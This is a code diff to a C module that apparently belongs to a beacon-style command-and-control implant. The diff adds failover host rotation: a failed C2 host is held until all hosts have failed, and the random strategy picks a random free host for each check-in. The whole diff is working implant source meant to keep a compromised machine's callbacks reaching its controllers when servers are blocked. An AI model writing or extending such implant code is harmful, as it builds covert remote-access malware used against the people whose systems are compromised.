@@ -18,11 +18,17 @@
  * Design: the baked SETTING_DOMAINS blob lives in the guarded settings
  * image and must not be mutated, and strategy.cpp keeps one-shot static
  * parse state per process. This module is therefore an overlay: once
- * seeded it owns the host/uri list the main loop picks from (round-robin
- * skipping held hosts); until the first verb the baked strategy path
- * keeps serving. Both paths end in the same per-cycle http_init(), so a
- * host swap takes effect on the very next check-in with no connection
- * surgery.
+ * seeded it owns the host/uri list the main loop picks from, skipping held
+ * hosts; until the first verb the baked strategy path keeps serving. Both
+ * paths end in the same per-cycle http_init(), so a host swap takes effect
+ * on the very next check-in with no connection surgery.
+ *
+ * 4.10 host rotation: in the random and round-robin strategies a host that
+ * failed is held until every host has failed ("to stabilize connections");
+ * the random strategy picks a random free host (strategy.cpp keeps the
+ * same rules for the DNS beacons, which pick their host there). The
+ * failover-* and rotate-* strategies hold nothing - they move on a failure
+ * by their own timers.
  *
  * Task wire (COMMAND_HOST_CONFIG, little-endian datap):
  *   int verb; then per verb (z = length-prefixed ASCIIZ string):
@@ -158,8 +164,16 @@ BOOL hostcfg_active(void) {
 	return hc_n > 0;
 }
 
-/* pick the next host for this cycle: round-robin skipping held entries.
- * When every host is held, release them all first (official semantics).
+/* the strategies that hold a failed host; the baked value, 0 (round-robin)
+ * when the payload has none */
+static BOOL hc_auto_hold(void) {
+	int strategy = setting_short(SETTING_DOMAIN_STRATEGY);
+	return strategy == HOST_STRATEGY_ROUND_ROBIN || strategy == HOST_STRATEGY_RANDOM;
+}
+
+/* pick the next host for this cycle: round-robin (or, for the random
+ * strategy, a random pick) among the entries that are not held. When every
+ * host is held, release them all first (official semantics).
  * Returns FALSE when the overlay is empty (caller falls back to the baked
  * strategy path). */
 BOOL hostcfg_pick(char * host, int hmax, char * uri, int umax) {
@@ -175,6 +189,22 @@ BOOL hostcfg_pick(char * host, int hmax, char * uri, int umax) {
 			for (i = 0; i < hc_n; i++)
 				hc_tab[i].held = FALSE;
 		}
+	}
+
+	/* random strategy: start at a random entry that is not held (the walk
+	 * below steps from hc_cursor + 1, so it stops exactly there) */
+	if (hc_n > 1 && setting_short(SETTING_DOMAIN_STRATEGY) == HOST_STRATEGY_RANDOM) {
+		int i, free_n = 0, pick;
+		for (i = 0; i < hc_n; i++)
+			free_n += hc_tab[i].held ? 0 : 1;
+		pick = rand() % free_n;
+		for (i = 0; i < hc_n; i++) {
+			if (hc_tab[i].held)
+				continue;
+			if (pick-- == 0)
+				break;
+		}
+		hc_cursor = (i + hc_n - 1) % hc_n;
 	}
 
 	for (scans = 0; scans < hc_n; scans++) {
@@ -213,8 +243,13 @@ void hostcfg_note(const char * host, BOOL ok) {
 		host = hc_last_host;
 	for (i = 0; i < hc_n; i++) {
 		if (_stricmp(hc_tab[i].host, host) == 0) {
-			if (!ok)
+			if (!ok) {
 				hc_tab[i].fails++;
+				/* 4.10: a failed host is held until all of them have failed.
+				 * A one-host list holds and releases itself in the same breath. */
+				if (hc_auto_hold())
+					hc_tab[i].held = TRUE;
+			}
 			break;
 		}
 	}
